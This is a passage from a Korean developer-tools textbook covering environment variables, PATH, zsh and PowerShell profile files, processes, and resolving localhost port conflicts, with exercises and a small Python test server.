파이썬에는 `test`가 넘어갔지만 셸에는 남지 않았다. 설치 안내나 AI의 답에서 `DEBUG=1 python app.py` 같은 명령을 보면 이 문법이다. PowerShell에는 이 문법이 없다. `$env:DEBUG = "1"`로 정하고 실행한 다음, 필요하면 `Remove-Item Env:DEBUG`로 지운다.

> **Windows에서 `$HOME`은 환경 변수가 아니다**
> PowerShell에서 `$HOME`은 PowerShell이 미리 만들어 둔 **PowerShell 변수**다. 그래서 파이썬에서 `os.getenv("HOME")`을 하면 대개 `None`이다. Windows의 홈 폴더 환경 변수는 `USERPROFILE`이다. 파이썬 코드에서 홈 폴더가 필요하면 운영체제에 상관없이 `Path.home()`을 쓴다(기초 과정 7장).

### 3.4.2 `PATH`와 명령을 찾는 순서

1장과 기초 과정 9장에서 `PATH`는 "명령을 찾을 폴더의 목록"이고 앞에서부터 찾는다고 했다. 실제 목록을 본다. 한 줄로 이어져 있어서 읽기 어려우므로 구분자에서 나누어 한 줄에 하나씩 보여 준다.

```
# macOS — 구분자는 콜론(:)
echo $PATH | tr ':' '\n'

# Windows — 구분자는 세미콜론(;)
$env:PATH -split ';'
```

```
# macOS
/opt/homebrew/bin
/opt/homebrew/sbin
/usr/local/bin
/usr/bin
/bin
/usr/sbin
/sbin

# Windows
C:\Program Files\PowerShell\7
C:\WINDOWS\system32
C:\WINDOWS
C:\Program Files\Git\cmd
C:\Users\jinyoung\AppData\Local\Programs\Python\Python313\Scripts\
C:\Users\jinyoung\AppData\Local\Programs\Python\Python313\
C:\Users\jinyoung\AppData\Local\Microsoft\WindowsApps
C:\Users\jinyoung\AppData\Local\Programs\Microsoft VS Code\bin
```

`tr ':' '\n'`은 콜론을 줄바꿈으로 바꾸는 명령이고, `-split ';'`은 세미콜론에서 나누는 PowerShell 연산자다. 목록은 컴퓨터마다 다르다.

같은 이름의 프로그램이 여러 폴더에 있으면 **앞의 폴더에 있는 것**이 실행된다. 어느 것들이 있는지 모두 보려면 다음과 같이 한다.

```
# macOS
type -a python3

# Windows
Get-Command python -All
```

```
# macOS
python3 is /usr/local/bin/python3
python3 is /usr/bin/python3

# Windows
CommandType     Name         Version    Source
-----------     ----         -------    ------
Application     python.exe   3.13.2.0   C:\Users\jinyoung\AppData\Local\Programs\Python\Python313\python.exe
Application     python.exe   0.0.0.0    C:\Users\jinyoung\AppData\Local\Microsoft\WindowsApps\python.exe
```

`python3`나 `python`을 입력하면 첫 줄의 것이 실행된다. 둘째 줄의 것은 가려져 있다. macOS의 `/usr/bin/python3`는 애플이 넣어 둔 것이고, Windows의 `WindowsApps\python.exe`는 파이썬이 없을 때 Microsoft Store를 열어 주는 바로 가기다. 순서가 바뀌면 "분명히 설치했는데 다른 파이썬이 실행되는" 일이 생긴다. 가상환경을 활성화하면 가상환경의 폴더가 `PATH` 맨 앞에 들어가서 이 목록 맨 위에 나타난다(1.3.3). 활성화한 상태에서 같은 명령을 실행해 확인해 보자.

`PATH`도 환경 변수이므로 바꿀 수 있다. 내가 만든 스크립트를 모아 둔 폴더(`~/bin`)를 맨 앞에 더한다면 다음과 같다.

```
# macOS
export PATH="$HOME/bin:$PATH"

# Windows
$env:PATH = "$HOME\bin;" + $env:PATH
```

기존 값(`$PATH`, `$env:PATH`)을 뒤에 붙였다는 점이 중요하다. `export PATH="$HOME/bin"`처럼 기존 값을 빼먹으면 `ls`, `git`, `python3`를 포함한 거의 모든 명령을 찾지 못하게 된다. 그런 실수를 했다면 당황하지 말고 터미널을 닫았다가 새로 연다. 터미널에서 바꾼 값은 그 창에서만 유효하기 때문이다.

**`command not found`가 나면**

명령을 찾지 못했다는 오류(`zsh: command not found: rg`, PowerShell은 `The term 'rg' is not recognized ...`)가 나면 다음 순서로 확인한다.

1. **이름** — 오타는 없나? macOS에서 `python` 대신 `python3`인가?
2. **설치** — 정말 설치했나? 설치 명령이 오류 없이 끝났나?
3. **새 터미널** — 설치한 **뒤에** 연 터미널인가? 3.4.3에서 이유를 본다.
4. **가상환경** — 가상환경에 설치한 명령인데 활성화하지 않았나?
5. **`PATH`** — 설치된 위치가 `PATH`의 폴더 중에 있나? 설치 안내에 "`PATH`에 추가하라"는 단계가 있었나?

### 3.4.3 셸 설정 파일

터미널을 열 때마다 별칭을 만들고, 환경 변수를 정하고, 3.1.6의 인코딩 설정을 다시 입력할 수는 없다. 셸은 시작할 때 **설정 파일**을 읽어서 그 안의 명령을 실행한다. 여기에 적어 두면 터미널을 열 때마다 저절로 실행된다.

| | zsh(macOS) | PowerShell 7(Windows) |
|---|---|---|
| 설정 파일 | `~/.zshrc` | `$PROFILE`이 가리키는 파일 |
| 실제 위치 | `/Users/본인계정/.zshrc` | `문서\PowerShell\Microsoft.PowerShell_profile.ps1` |
| 파일이 없으면 | 만든다 | 만든다 |
| 바꾼 내용을 지금 창에 적용 | `source ~/.zshrc` | `. $PROFILE` |

**설정 파일 열기**

```
# macOS
code ~/.zshrc

# Windows
$PROFILE
Test-Path $PROFILE
```

```
# Windows
C:\Users\jinyoung\Documents\PowerShell\Microsoft.PowerShell_profile.ps1
False
```

macOS는 `~/.zshrc`가 없어도 VS Code가 빈 파일을 열어 주고, 저장하면 만들어진다. Windows의 `$PROFILE`은 설정 파일의 **경로를 담은 변수**다. `Test-Path`가 `False`이면 아직 파일이 없다는 뜻이므로 만든 다음 연다.

```
# Windows
New-Item -ItemType File -Path $PROFILE -Force
code $PROFILE
```

`-Force`는 중간 폴더(`PowerShell`)가 없으면 함께 만들어 준다. 이미 파일이 있다면 `-Force`가 내용을 비워 버리므로, `Test-Path`가 `True`이면 이 명령을 건너뛰고 `code $PROFILE`만 실행한다.

> **Windows `$PROFILE`의 위치 두 가지**
> 문서 폴더를 OneDrive로 백업하고 있으면 경로가 `C:\Users\본인계정\OneDrive\문서\PowerShell\...`처럼 OneDrive 안이 된다. 그대로 써도 된다. 그리고 PowerShell 7과 5.1의 설정 파일은 **다르다.** 5.1은 `문서\WindowsPowerShell\` 폴더의 파일을 읽는다. 실행 정책(1.2.4)처럼 이것도 따로다. 이 교재에서는 PowerShell 7의 설정 파일만 다룬다.

> **설정 파일도 스크립트다**
> `$PROFILE`은 `.ps1` 스크립트이므로 실행 정책의 적용을 받는다. 1.2.4에서 확인한 실행 정책이 `RemoteSigned`이면 문제없다. `Restricted`이면 PowerShell을 열 때 "스크립트를 실행할 수 없으므로 ... 로드할 수 없습니다"라는 오류가 나고 설정이 적용되지 않는다.

**무엇을 적나**

이 과정에서 쓸 설정을 적는다. `#`로 시작하는 줄은 주석이다. 먼저 macOS다.

```bash
# ~/.zshrc — zsh를 열 때마다 실행된다

# 별칭: 짧은 이름 = 긴 명령
alias ll='ls -lah'
alias gst='git status'

# 함수: 폴더를 만들고 바로 그 안으로 들어간다
mkcd() {
    mkdir -p "$1" && cd "$1"
}

# (선택) > 로 기존 파일을 덮어쓰지 않게 한다(3.1.2). 켜려면 앞의 #을 지운다
# setopt noclobber
```

다음은 Windows다.

```powershell
# $PROFILE — PowerShell 7을 열 때마다 실행된다

# 파이프로 한글을 주고받을 때 모두 UTF-8로(3.1.6)
[Console]::InputEncoding = [Console]::OutputEncoding = [System.Text.UTF8Encoding]::new()
$env:PYTHONUTF8 = "1"

# 별칭: 명령 이름만 바꿀 수 있다
Set-Alias -Name which -Value Get-Command

# 옵션까지 붙이려면 함수로
function ll { Get-ChildItem -Force @args }
function gst { git status @args }

# 폴더를 만들고 바로 그 안으로 들어간다
function mkcd($Path) {
    New-Item -ItemType Directory -Path $Path -Force | Out-Null
    Set-Location $Path
}
```

- **별칭**(alias)은 긴 명령에 짧은 이름을 붙인다. zsh의 `alias`는 옵션까지 담을 수 있다(`ls -lah`). PowerShell의 `Set-Alias`는 **명령 이름만** 바꿀 수 있고 옵션은 담지 못한다. 위의 `which`처럼 이름만 바꾸는 경우에 쓴다. 이제 Windows에서도 `which python`이 `Get-Command python`으로 실행된다. 그래서 PowerShell에서는 옵션이 필요한 줄임은 **함수**로 만든다. `@args`는 "함수에 준 인자를 그대로 넘겨라"는 뜻이다. `ll practice`라고 입력하면 `Get-ChildItem -Force practice`가 실행된다.
- `mkcd`는 2.4.1의 `mkdir -p`와 3.3.2의 `&&`를 묶은 함수다. `mkcd ch04`로 폴더를 만들고 들어간다. zsh 함수 안의 `$1`은 첫 번째 인자다.
- Windows의 첫 두 줄은 3.1.6의 인코딩 설정이다. 이제 터미널을 열 때마다 적용된다.
- `setopt noclobber`는 주석으로 두었다. 켜 두면 실수로 덮어쓰는 일은 막지만, 이후 장에서 `pip freeze > requirements.txt`처럼 일부러 다시 만들 때마다 `>|`를 써야 한다. 익숙해진 뒤에 켤지 정한다.

**적용하기 — 그리고 새 터미널이 필요한 이유**

파일을 저장해도 **지금 열려 있는 터미널에는 적용되지 않는다.** 셸은 **시작할 때 한 번** 설정 파일을 읽기 때문이다. 지금 창에 적용하려면 설정 파일을 다시 읽게 한다.

```
# macOS
source ~/.zshrc

# Windows
. $PROFILE
```

`source`와 `.`은 "이 파일의 명령을 **지금 이 셸 안에서** 실행하라"는 뜻이다. 아니면 새 터미널을 연다. 이쪽이 더 확실하다. 지금 창에서 `source`를 여러 번 하다 보면 지운 설정이 남아 있는 등 실제로 새 터미널을 열었을 때와 상태가 달라질 수 있다.

같은 이유로, **프로그램을 설치한 뒤에는 새 터미널을 연다.** 환경 변수는 프로그램이 **시작할 때** 부모 프로그램에게서 복사해 받는다. 설치 프로그램이 `PATH`를 바꾸어도(Windows는 사용자 설정에, macOS는 셸 설정 파일에 적는다) 이미 실행 중인 셸은 시작할 때 받은 옛 `PATH`를 그대로 쓴다. VS Code의 통합 터미널은 VS Code가 시작할 때 받은 환경을 물려받으므로, VS Code 안의 터미널에서 새 명령을 찾지 못하면 **VS Code를 완전히 종료했다가** 다시 연다(1.2.4에서 PowerShell 7을 설치한 뒤 VS Code를 다시 시작한 것도 같은 이유다).

```
터미널 앱 ──시작할 때 환경을 복사──▶ 셸 ──명령을 실행할 때 복사──▶ python, git ...
   ▲
나중에 바뀐 설정은 이미 실행 중인 프로그램에 전해지지 않는다
```

**설정 파일을 고칠 때 주의할 것**

- 고치기 전에 복사해 둔다(`cp ~/.zshrc ~/.zshrc.bak`, Windows `Copy-Item $PROFILE "$PROFILE.bak"`). 오타 하나로 터미널을 열 때마다 오류가 날 수 있다. 오류 메시지가 나오면 몇째 줄인지 보고 고친 뒤 새 터미널을 연다.
- 설치 프로그램과 AI 도구도 이 파일에 줄을 더한다. Homebrew, 각종 설치 스크립트(3.7), 가상환경 도구가 "셸 설정 파일에 다음 줄을 추가했다"고 알리는 일이 흔하다. 가끔 열어서 무엇이 들어 있는지 읽어 본다. 모르는 줄은 지우지 말고 무엇인지 먼저 알아본다.
- **비밀 값은 적지 않는다.** 인터넷에는 `export OPENAI_API_KEY=...`를 `~/.zshrc`에 적으라는 안내가 많다. 그렇게 하면 내가 실행하는 **모든 프로그램**이 그 키를 받고, 설정 파일을 백업하거나 공유할 때 키도 함께 퍼진다. 이 과정에서는 API 키를 프로젝트마다 `.env` 파일에 두고 그 프로그램만 읽게 한다("웹·API 기초"). 그리고 `.env`는 Git에 올리지 않는다(8장).

> **영구 환경 변수 — Windows의 또 다른 방법**
> `$PROFILE`에 적은 환경 변수는 PowerShell을 열었을 때만 정해진다. 탐색기에서 실행한 프로그램이나 VS Code의 실행 단추(4장)에는 적용되지 않을 수 있다. Windows에는 운영체제가 보관하는 **사용자 환경 변수**도 있다. `[Environment]::SetEnvironmentVariable("PYTHONUTF8", "1", "User")`로 정하거나, 시작 메뉴에서 "환경 변수"를 검색해 "계정의 환경 변수 편집" 창에서 정한다. 이후에 시작하는 모든 프로그램이 받는다. 3.1.6의 `[Console]` 설정은 PowerShell 안의 설정이라 이 방법으로는 정할 수 없고 `$PROFILE`에 둔다.

### 3.4.4 bash의 설정 파일

리눅스 서버, Docker 컨테이너, GitHub Actions에서 만나는 bash는 설정 파일 이름이 다르다. 대화형 셸은 `~/.bashrc`를 읽는다. zsh의 `~/.zshrc`에 해당한다. 서버에 접속해서(SSH, "LLM 서비스 배포") 별칭을 만들거나 `PATH`를 고칠 때 이 파일을 연다. 문법은 이 절의 zsh 예와 거의 같다.

macOS에는 `~/.zprofile`이라는 파일도 있다. 터미널 앱이 셸을 시작할 때 `~/.zshrc`보다 먼저 읽는다. 1.2.2에서 Homebrew를 설치했다면 설치 안내에 따라 `brew shellenv`를 실행하는 줄을 여기에 넣었을 것이다. 별칭과 함수 같은 것은 `~/.zshrc`에 두면 된다.

### 실습 3-4. 내 셸 설정 파일 만들기

1. 셸 설정 파일이 있는지 확인하고 연다. 이미 있다면 먼저 `.bak`으로 복사해 둔다. 들어 있는 줄이 있으면 각 줄이 무엇을 하는지 `shell-config.md`(`~/devtools-lab/ch03`)에 적는다. 모르는 줄은 "모름"이라고 적고 3.8.4의 방법으로 알아본다.
2. 3.4.3의 설정 중 마음에 드는 것을 적어 넣는다. Windows는 인코딩 설정 두 줄을 꼭 넣는다. 자기만의 별칭이나 함수를 하나 이상 더한다(예: `ch03` 실습 폴더로 바로 가는 별칭).
3. 저장한 뒤 **지금 터미널**에서 `ll`을 실행해 본다. 왜 안 되는지 적는다. 그다음 새 터미널을 열어 다시 실행한다.
4. 새 터미널에서 다음을 확인한다.
   - (macOS) `alias`를 실행하면 내가 만든 별칭이 목록에 있는가? `type ll`과 `type mkcd`는 각각 무엇이라고 하는가?
   - (Windows) `Get-Command ll`과 `Get-Command which`의 `CommandType`은 각각 무엇인가? `[Console]::OutputEncoding.WebName`과 `$env:PYTHONUTF8`의 값은?
5. 환경 변수 실험: 터미널에서 `LAB_STEP`(Windows `$env:LAB_STEP`)을 `4`로 정하고, 파이썬으로 읽는다. 같은 터미널에서 새 터미널 탭을 열어 다시 읽는다. 결과가 다른 이유를 적는다. macOS는 `export` 없이 정했을 때도 해 본다.
6. `PATH`를 한 줄에 하나씩 보여 주고, `git`, `code`, `python`(macOS `python3`)이 각각 몇째 폴더에서 발견되는지 `type -a`(Windows `Get-Command -All`)로 확인해 적는다.

## 3.5 프로세스와 포트

### 3.5.1 프로세스와 PID

프로그램을 실행하면 운영체제는 그 프로그램을 위한 **프로세스**(process)를 만든다. 프로세스는 "실행 중인 프로그램 하나"다. 같은 `python`이라도 터미널 두 곳에서 실행하면 프로세스가 둘이다. 운영체제는 프로세스마다 번호를 붙이는데, 이것이 **PID**(process ID)다. 프로세스를 멈추거나 정보를 볼 때 PID로 가리킨다.

```
# macOS
ps

# Windows
Get-Process -Id $PID
```

```
# macOS
  PID TTY           TIME CMD
 4821 ttys000    0:00.12 -zsh

# Windows
 NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName
 ------    -----      -----     ------      --  -- -----------
     88    61.25     121.40       1.95   12340   1 pwsh
```

macOS의 `ps`는 이 터미널에서 실행 중인 프로세스를 보여 준다. 지금은 셸(`zsh`) 하나다. PowerShell에서 `$PID`는 지금 이 PowerShell의 PID를 담은 변수다. 셸도 프로세스이고, 셸에서 실행한 프로그램은 셸의 **자식 프로세스**가 된다. 3.4.3에서 본 "환경 변수는 시작할 때 부모에게서 복사해 받는다"의 부모와 자식이 이것이다.

이름으로 찾을 때는 다음과 같이 한다.

| 하는 일 | macOS | Windows |
|---|---|---|
| 이름으로 찾기 | `ps aux \| grep python` 또는 `pgrep -fl python` | `Get-Process python` |
| PID로 자세히 보기 | `ps -p 12345 -o pid,command` | `Get-Process -Id 12345 \| Select-Object Id, Path` |
| 멈추기 | `kill 12345` | `Stop-Process -Id 12345` |
| 화면으로 보기 | "활성 상태 보기" 앱 | 작업 관리자(`Ctrl+Shift+Esc`) |

파이썬 프로그램은 자기 PID를 `os.getpid()`로 알 수 있다. 다음 절의 서버 프로그램이 그것을 출력한다.

### 3.5.2 끝나지 않는 프로그램 — 서버

지금까지 실행한 프로그램은 일을 마치면 끝나고 프롬프트가 돌아왔다. **서버** 프로그램은 다르다. 요청이 오기를 기다렸다가 답하고, 다시 기다린다. 스스로 끝나지 않는다. "웹·API 기초"부터 만들 웹 서버와 API 서버, "에이전트 개발"의 MCP 서버, Jupyter(9장)가 모두 이런 프로그램이다.

표준 라이브러리만으로 작은 웹 서버를 만들어 본다. `ch03` 폴더에 `server.py`를 만든다. 코드를 다 이해할 필요는 없다. 웹 서버는 "웹·API 기초"에서 배운다. 지금은 **포트 하나를 차지하고 끝나지 않는 프로그램**이라는 점만 본다.

```python
# server.py — 포트 하나를 차지하고 요청에 답하는 작은 웹 서버
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = f"안녕하세요. PID {os.getpid()} 서버가 답했습니다.\n".encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class Server(HTTPServer):
    # 방금 끈 서버의 포트를 곧바로 다시 쓸 수 있게 하는 설정이다.
    # Windows에서는 이 설정이 "이미 쓰는 포트에 겹쳐 띄우기"까지 허락하므로 끈다.
    allow_reuse_address = sys.platform != "win32"


server = Server(("127.0.0.1", PORT), Handler)
print(f"서버 시작: http://localhost:{PORT} (PID {os.getpid()}, 멈추려면 Ctrl+C)", flush=True)
server.serve_forever()
```

실행한다.

```
# macOS
python3 server.py

# Windows
python server.py
```

```
서버 시작: http://localhost:8000 (PID 12345, 멈추려면 Ctrl+C)
```

프롬프트가 돌아오지 않는다. 2.1.3에서 본 "명령이 아직 실행 중"인 상태다. 웹 브라우저를 열고 주소창에 `http://localhost:8000`을 입력한다.

```
안녕하세요. PID 12345 서버가 답했습니다.
```

터미널에는 요청이 올 때마다 기록이 한 줄씩 찍힌다. 기록은 표준 오류로 나온다.

```
127.0.0.1 - - [13/Nov/2026 10:15:02] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [13/Nov/2026 10:15:02] "GET /favicon.ico HTTP/1.1" 200 -
```

브라우저는 페이지 말고도 탭에 표시할 아이콘(`/favicon.ico`)을 따로 요청한다. `access.log`에 `/favicon.ico`가 있었던 이유다.

**서버를 띄운 채로 다른 명령 실행하기**

서버가 터미널을 차지하고 있으니 다른 명령을 실행하려면 **터미널을 하나 더 연다.** 2장의 실습 2-5에서 로그를 지켜볼 때와 같다.

- 터미널 앱: 새 탭(`Cmd+T` / `Ctrl+Shift+T`) 또는 새 창
- VS Code: 터미널 패널의 `+`로 새 터미널을 열거나, **터미널 분할**(macOS `Cmd+\`, Windows `Ctrl+Shift+5`)로 한 화면에 두 터미널을 나란히 띄운다. 왼쪽에는 서버, 오른쪽에서는 명령을 실행하는 식이다.

새 터미널도 `~/devtools-lab/ch03`으로 이동한다. 앞으로 "첫째 터미널"은 서버를 띄운 터미널, "둘째 터미널"은 새로 연 터미널이다.

> **zsh의 `&` — 백그라운드 실행**
> zsh에서 명령 끝에 `&`를 붙이면(`python3 server.py &`) 프로그램이 **뒤에서** 실행되고 프롬프트가 바로 돌아온다. `jobs`로 뒤에서 도는 프로그램을 보고, `fg`로 앞으로 가져온다. 편리하지만 서버의 출력이 내가 입력하는 명령 사이에 섞여 나오고, 무엇이 떠 있는지 잊기 쉽다. 이 과정에서는 터미널을 하나 더 여는 쪽을 권한다. 2.3.3의 `Ctrl+Z`로 멈춘 프로그램도 `jobs`에 보인다.

### 3.5.3 `localhost`와 포트

주소 `http://localhost:8000`을 나누어 읽는다.

- **`localhost`** — "이 컴퓨터 자신"을 가리키는 이름이다. 숫자 주소로는 `127.0.0.1`이다. 이 주소로 보낸 요청은 네트워크 밖으로 나가지 않고 내 컴퓨터 안에서 돈다. 개발 중인 서버는 대개 `localhost`에 띄워서 나만 접속하게 한다. `server.py`도 `"127.0.0.1"`에 띄웠다.
- **포트**(port) **`8000`** — 한 컴퓨터 안에서 **어느 프로그램**에게 가는 요청인지 가리키는 번호다. 주소가 건물이라면 포트는 호수다. 0부터 65535까지 있고, **한 포트는 한 번에 한 프로그램만** 차지할 수 있다.

자주 만나는 포트 번호는 다음과 같다.

| 포트 | 흔한 쓰임 | 이 로드맵에서 |
|---|---|---|
| 80, 443 | 웹(HTTP, HTTPS)의 기본 포트. 주소에 포트를 적지 않으면 이것이다 | 배포한 서비스 |
| 22 | SSH | "LLM 서비스 배포"에서 서버 접속 |
| 8000 | 파이썬 개발 서버(FastAPI의 uvicorn, Django 등)의 기본값 | "웹·API 기초" |
| 8888 | Jupyter | 9장 |
| 3000 | Node.js 계열 개발 서버 | |
| 5432 | PostgreSQL 데이터베이스 | |
| 5000 | Flask 개발 서버의 기본값 | macOS에서는 "AirPlay 수신 모드"가 이 포트를 쓰고 있어서 충돌하는 일이 잦다 |

### 3.5.4 "이미 사용 중인 포트" 오류

첫째 터미널에서 서버가 돌고 있는 상태로, 둘째 터미널에서 서버를 하나 더 띄워 본다.

```
# macOS
python3 server.py

# Windows
python server.py
```

```
# macOS
Traceback (most recent call last):
  ...
OSError: [Errno 48] Address already in use

# Windows
Traceback (most recent call last):
  ...
OSError: [WinError 10048] 각 소켓 주소(프로토콜/네트워크 주소/포트)는 하나만 사용할 수 있습니다
```

"주소(포트)가 이미 사용 중"이라는 오류다. 8000번은 첫째 서버가 차지하고 있다. 지금은 원인이 눈앞에 있지만, 실제로는 다음과 같은 경우에 만난다.

- 다른 터미널 탭이나 VS Code 터미널에 띄워 둔 서버를 잊었다.
- 2.3.3에서 본 것처럼 `Ctrl+C` 대신 `Ctrl+Z`를 눌러서 서버가 **일시 정지** 상태로 남아 있다. 일시 정지한 서버도 포트를 쥐고 있다. 그래서 브라우저로 접속하면 응답 없이 한참 기다리기만 한다.
- VS Code의 디버거(4장)나 AI 코딩 도구가 실행한 서버가 뒤에서 돌고 있다.
- 아예 다른 프로그램이 그 포트를 쓴다(macOS의 5000번처럼).

해결 방법은 두 가지다. 다른 포트를 쓰거나(`python server.py 8001` — 대부분의 서버 프로그램에는 포트를 바꾸는 옵션이 있다), 그 포트를 쓰는 프로세스를 찾아 멈추는 것이다. 후자를 해 본다.

**macOS — `lsof`로 찾고 `kill`로 멈추기**

`lsof`(list open files)는 프로세스가 열어 둔 파일과 네트워크 연결을 보여 준다. `-i :8000`은 "8000번 포트를 쓰는 것"이다.

```
# macOS
lsof -nP -i :8000
```

```
COMMAND   PID     USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
Python  12345 jinyoung    3u  IPv4 0x1a2b3c4d5e6f7a8b      0t0  TCP 127.0.0.1:8000 (LISTEN)
```

`PID` 열의 `12345`가 8000번을 차지한 프로세스다. `(LISTEN)`은 "이 포트에서 요청을 기다리는 중"이라는 뜻이다. `-n`과 `-P`는 주소와 포트를 이름으로 바꾸지 말고 숫자 그대로 보여 달라는 옵션이다. 빼면 `localhost:irdmi`처럼 알아보기 힘든 이름이 나온다.

멈추기 전에 **무엇인지 확인한다.** PID만 보고 멈추면 엉뚱한 프로그램을 끌 수 있다.

```
# macOS
ps -p 12345 -o pid,command
```

```
  PID COMMAND
12345 /Library/Frameworks/Python.framework/Versions/3.13/.../Python server.py
```

`server.py`가 맞다. 멈춘다.

```
# macOS
kill 12345
```

첫째 터미널을 보면 서버가 끝나고 프롬프트가 돌아와 있다. `lsof -nP -i :8000`을 다시 실행하면 아무것도 나오지 않는다. 이제 둘째 터미널에서 서버를 띄우면 잘 뜬다.

`kill`은 프로세스에게 "끝내라"는 신호를 보낸다. 프로그램은 신호를 받고 정리할 일을 마친 뒤 끝난다. 그래도 끝나지 않는 프로그램에는 `kill -9 12345`로 **강제 종료** 신호를 보낸다. 운영체제가 즉시 없애 버리므로 프로그램이 파일을 쓰던 중이었다면 파일이 깨질 수 있다. `kill -9`는 마지막 수단이다.

일시 정지한(`Ctrl+Z`) 서버였다면, 그 서버를 띄운 터미널에서 `jobs`로 확인하고 `fg`로 앞으로 가져온 다음 `Ctrl+C`로 멈추는 것이 가장 깔끔하다.

**Windows — `Get-NetTCPConnection`으로 찾고 `Stop-Process`로 멈추기**

```
# Windows
Get-NetTCPConnection -LocalPort 8000 -State Listen
```

```
LocalAddress  LocalPort RemoteAddress RemotePort State  AppliedSetting OwningProcess
------------  --------- ------------- ---------- -----  -------------- -------------
127.0.0.1     8000      0.0.0.0       0          Listen                12345
```

`OwningProcess`가 PID다. 무엇인지 확인한다.

```
# Windows
Get-Process -Id 12345 | Select-Object Id, ProcessName, Path
```

```
   Id ProcessName Path
   -- ----------- ----
12345 python      C:\Users\jinyoung\AppData\Local\Programs\Python\Python313\python.exe
```

`python`인 것은 알겠는데 **어느 스크립트**를 실행 중인지는 보이지 않는다. 파이썬 프로그램이 여럿 떠 있을 수 있으므로 명령줄까지 확인한다.

```
# Windows
(Get-CimInstance Win32_Process -Filter "ProcessId = 12345").CommandLine
```

```
"C:\Users\jinyoung\AppData\Local\Programs\Python\Python313\python.exe" server.py
```

`server.py`가 맞다. 멈춘다.

```
# Windows
Stop-Process -Id 12345
```

찾기와 확인을 한 줄로 이을 수도 있다. 괄호 안의 명령이 먼저 실행되어 PID가 되고, 그 PID로 `Get-Process`가 실행된다.

```
# Windows
Get-Process -Id (Get-NetTCPConnection -LocalPort 8000 -State Listen).OwningProcess
```

옛날 방식인 `netstat -ano | findstr :8000`도 인터넷에서 자주 보인다. 마지막 열이 PID다.

> **이름으로 멈추지 않는다**
> `Stop-Process -Name python`(macOS `pkill python`)은 이름이 `python`인 프로세스를 **모두** 멈춘다. 다른 프로젝트의 서버, Jupyter 커널(9장), VS Code가 실행한 파이썬까지 함께 꺼진다. 포트 문제를 풀 때는 포트로 PID를 찾고, 확인하고, 그 PID만 멈춘다.

> **`server.py`의 `allow_reuse_address`**
> 서버를 멈추고 곧바로 다시 띄우면 macOS와 리눅스에서는 잠시 동안 "이미 사용 중" 오류가 나는 일이 있다. 방금 끝난 연결의 흔적이 포트에 잠깐 남기 때문이다. `allow_reuse_address`는 그 흔적을 무시하고 바로 띄우게 하는 설정이다. 그런데 Windows에서는 같은 설정이 "다른 프로그램이 쓰고 있는 포트에도 겹쳐 띄우기"를 허락해서, 오류 없이 서버가 두 개 떠 버린다. 그래서 `server.py`는 Windows에서만 이 설정을 끈다. 파이썬에 들어 있는 간단한 파일 서버 `python -m http.server`는 이 설정을 켜 두었으므로, Windows에서 같은 포트로 두 번 띄워도 오류가 나지 않을 수 있다. 웹 프레임워크들은 운영체제마다 이런 처리를 해 둔다.

### 실습 3-5. 포트 충돌 해결하기

`~/devtools-lab/ch03`에서 한다. 실행한 명령과 결과를 `process.md`에 적는다.

1. 첫째 터미널에서 `server.py`를 띄우고, 출력된 PID를 적는다. 브라우저로 `http://localhost:8000`에 접속해서 화면에 나온 PID와 같은지 확인한다.
2. 둘째 터미널에서 `server.py`를 하나 더 띄워 오류 메시지를 확인한다. 이어서 `python server.py 8001`(macOS `python3`)로 다른 포트에 띄우고, 브라우저로 `http://localhost:8001`에 접속한다. 두 서버의 PID가 다른 것을 확인한 뒤 8001번 서버는 `Ctrl+C`로 멈춘다.
3. 둘째 터미널에서 8000번을 쓰는 프로세스를 찾고, 무엇인지 확인한 다음 멈춘다. 첫째 터미널에서 무슨 일이 일어났는지 적는다.
4. (macOS) 첫째 터미널에서 서버를 다시 띄우고, 이번에는 `Ctrl+Z`를 누른다. 프롬프트가 돌아온 것을 확인하고 브라우저로 접속해 본다. 무슨 일이 일어나는가? `jobs`와 `lsof -nP -i :8000`의 결과를 적은 다음, `fg`와 `Ctrl+C`로 정리한다.
5. (Windows) 첫째 터미널에서 서버를 다시 띄운 채로 **첫째 터미널 탭을 닫는다**(VS Code에서는 휴지통 아이콘). 둘째 터미널에서 8000번을 쓰는 프로세스가 남아 있는지 확인한다.
6. 작업 관리자(Windows) 또는 활성 상태 보기(macOS)를 열어 `python`(`Python`)을 검색하고, 지금 떠 있는 파이썬 프로세스가 없는지 확인한다.

## 3.6 반복 작업 묶기

기초 과정의 `ledger_app`에서 코드를 고칠 때마다 이런 명령을 입력한다.

```
python check_samples.py && python main.py samples/2026-10.csv
```

가상환경을 켜고, 폴더를 옮기고, 이 줄을 입력하고…. 매번 하는 일은 **스크립트**로 묶어 둔다. 스크립트는 명령을 차례로 적어 둔 파일이다. 파일 하나만 실행하면 된다. 그리고 그 파일이 곧 "이 프로젝트는 이렇게 검사한다"는 문서가 된다.

세 가지 방법이 있다. 셸 스크립트(macOS·리눅스), PowerShell 스크립트(Windows), 파이썬 스크립트(어디서나)다. 같은 일을 하는 세 스크립트를 만들고 비교한다. `~/python-lab/ch10/ledger_app` 폴더에 만든다. 이 파일들은 이 과정의 10장에서 `ledger_app`을 Git 저장소로 만들 때 함께 올린다.

### 3.6.1 셸 스크립트 — `.sh`

`ledger_app` 폴더에 `run_all.sh`를 만든다.

```bash
#!/usr/bin/env bash
# run_all.sh — 시험이 통과하면 예제 파일로 요약까지 실행한다
# 사용법: ./run_all.sh [CSV 파일]   (기본: samples/2026-10.csv)

set -e                       # 명령이 하나라도 실패하면 거기서 멈춘다
cd "$(dirname "$0")"         # 어디서 실행하든 이 스크립트가 있는 폴더에서
PY=.venv/bin/python          # 활성화하지 않아도 가상환경의 파이썬을 쓴다

$PY check_samples.py
$PY main.py "${1:-samples/2026-10.csv}"
echo "모두 끝났다."
```

한 줄씩 읽는다.

